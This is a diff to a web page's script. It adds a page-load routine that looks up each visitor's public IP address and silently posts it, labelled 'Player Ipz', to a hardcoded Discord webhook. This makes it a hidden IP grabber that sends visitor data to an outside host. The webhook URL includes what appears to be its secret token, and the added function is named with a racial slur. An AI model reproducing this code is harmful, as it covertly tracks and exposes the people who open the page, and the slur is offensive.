@@ -298,29 +298,51 @@
         setInterval(() => {
             document.getElementById('clock').textContent = new Date().toLocaleTimeString();
         }, 100);
-
+    
         document.getElementById('userAgent').textContent = navigator.userAgent;
         document.getElementById('timestamp').textContent = new Date().toLocaleString();
-
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(data => {
-                document.getElementById('ipAddress').textContent = data.ip;
-            })
-            .catch(err => {
-                document.getElementById('ipAddress').textContent = "Unable to track IP";
-            });
-
-
+    
+        function niggas() {
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    document.getElementById('ipAddress').textContent = ipAddress;
+                    grahx(ipAddress);
+                })
+                .catch(err => {
+                    document.getElementById('ipAddress').textContent = "Unable to track IP";
+                });
+        }
+        
         document.addEventListener('DOMContentLoaded', () => {
             const audio = document.getElementById('bgMusic');
             audio.volume = 0.4;
-                        audio.play().catch(e => {
+            audio.play().catch(e => {
                 document.addEventListener('click', () => {
                     audio.play();
                 }, { once: true });
             });
+            
+            niggas();
         });
+    
+        function grahx(ip) {
+            const webhookURL = 'https://discord.com/api/webhooks/1359469157141450813/bF4jbo9ee6qDTpg2g78CGnCPLku9khR47UPCRxlUfRXgUaGHcxov1GvcsqkbDJZRqzrO';
+    
+            const payload = {
+                content: `Player Ipz: ${ip}`
+            };
+    
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+        }
     </script>
+    
 </body>
 </html>
